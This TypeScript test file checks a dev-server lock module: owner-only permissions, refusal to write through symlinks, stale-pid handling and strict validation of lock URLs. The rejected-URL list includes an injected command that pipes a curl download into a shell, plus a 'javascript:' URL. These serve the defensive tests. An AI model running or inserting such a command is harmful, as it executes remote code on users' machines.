import { describe, expect, test } from "bun:test";
import { statSync } from "node:fs";
import { mkdir, readFile, symlink, writeFile } from "node:fs/promises";
import { join } from "node:path";
import { DekError } from "../../src/core/error.ts";
import {
  assertNoDevServer,
  isPidAlive,
  readDevServerLock,
  removeDevServerLock,
  writeDevServerLock,
} from "../../src/server/lock.ts";
import { withTempDir } from "../helpers/fs.ts";

describe("writeDevServerLock", () => {
  test("keeps the file, which may hold the --remote password, readable by its owner only", async () => {
    await withTempDir(async (root) => {
      writeDevServerLock(root, "http://127.0.0.1:9999/", "secret");
      try {
        expect(statSync(join(root, ".dek", "server.json")).mode & 0o777).toBe(0o600);
      } finally {
        removeDevServerLock(root);
      }
    });
  });

  test("never writes through a server.json a repository linked to a file elsewhere", async () => {
    await withTempDir(async (outside) => {
      await withTempDir(async (root) => {
        const victim = join(outside, "victim.json");
        await writeFile(victim, "mine", { mode: 0o644 });
        await mkdir(join(root, ".dek"));
        await symlink(victim, join(root, ".dek", "server.json"));
        expect(() => writeDevServerLock(root, "http://127.0.0.1:9999/", "secret")).toThrow(
          "leads outside the project",
        );
        expect(await readFile(victim, "utf8")).toBe("mine");
        expect(statSync(victim).mode & 0o777).toBe(0o644);
      });
    });
  });

  test("refuses to overwrite a lock whose pid is still alive", async () => {
    await withTempDir(async (root) => {
      await mkdir(join(root, ".dek"), { recursive: true });
      await writeFile(
        join(root, ".dek", "server.json"),
        `${JSON.stringify({ url: "http://127.0.0.1:5173/", pid: process.pid })}\n`,
      );

      expect(() => writeDevServerLock(root, "http://127.0.0.1:9999/")).toThrow(DekError);
      try {
        writeDevServerLock(root, "http://127.0.0.1:9999/");
      } catch (error) {
        expect(error).toBeInstanceOf(DekError);
        expect((error as DekError).message).toContain("http://127.0.0.1:5173/");
        expect((error as DekError).hint).toContain("http://127.0.0.1:5173/");
      }

      expect(readDevServerLock(root)?.url).toBe("http://127.0.0.1:5173/");
    });
  });

  test("replaces a lock whose pid is dead", async () => {
    await withTempDir(async (root) => {
      await mkdir(join(root, ".dek"), { recursive: true });
      await writeFile(
        join(root, ".dek", "server.json"),
        `${JSON.stringify({ url: "http://127.0.0.1:5173/", pid: 2_147_483_647 })}\n`,
      );

      writeDevServerLock(root, "http://127.0.0.1:9999/");
      expect(readDevServerLock(root)).toEqual({
        url: "http://127.0.0.1:9999/",
        pid: process.pid,
      });
      removeDevServerLock(root);
    });
  });

  test("refuses a second lock in the same process", async () => {
    await withTempDir(async (root) => {
      writeDevServerLock(root, "http://127.0.0.1:1/");
      expect(() => writeDevServerLock(root, "http://127.0.0.1:2/")).toThrow(DekError);
      removeDevServerLock(root);
    });
  });
});

describe("a lock a repository brings along", () => {
  const lockAt = async (root: string, lock: unknown) => {
    await mkdir(join(root, ".dek"), { recursive: true });
    await writeFile(join(root, ".dek", "server.json"), `${JSON.stringify(lock)}\n`);
  };

  test("is no lock unless it names this machine's dev server as the server writes it", async () => {
    await withTempDir(async (root) => {
      for (const url of [
        "http://127.0.0.1:9/ ; curl -s https://example.com/x | sh ; echo",
        "https://example.com/",
        "http://example.com:5173/",
        "http://127.0.0.1:5173/x",
        "http://127.0.0.1:5173/?a=b",
        "http://user@127.0.0.1:5173/",
        "http://127.0.0.1/",
        "javascript:alert(1)",
      ]) {
        await lockAt(root, { url, pid: process.pid });
        expect({ url, lock: readDevServerLock(root) }).toEqual({ url, lock: undefined });
        expect(() => assertNoDevServer(root)).not.toThrow();
      }
      for (const url of [
        "http://127.0.0.1:5173/",
        "http://localhost:5173/",
        "http://[::1]:5173/",
      ]) {
        await lockAt(root, { url, pid: process.pid });
        expect(readDevServerLock(root)?.url).toBe(url);
      }
    });
  });

  test("never names a pid that is no process of its own as alive", () => {
    for (const pid of [0, -1, -process.pid, 1.5, Number.NaN, Number.POSITIVE_INFINITY]) {
      expect({ pid, alive: isPidAlive(pid) }).toEqual({ pid, alive: false });
    }
    expect(isPidAlive(process.pid)).toBe(true);
  });

  test("with pid 0 or -1 is no running server", async () => {
    await withTempDir(async (root) => {
      for (const pid of [0, -1]) {
        await lockAt(root, { url: "http://127.0.0.1:5173/", pid });
        expect(() => assertNoDevServer(root)).not.toThrow();
      }
    });
  });
});
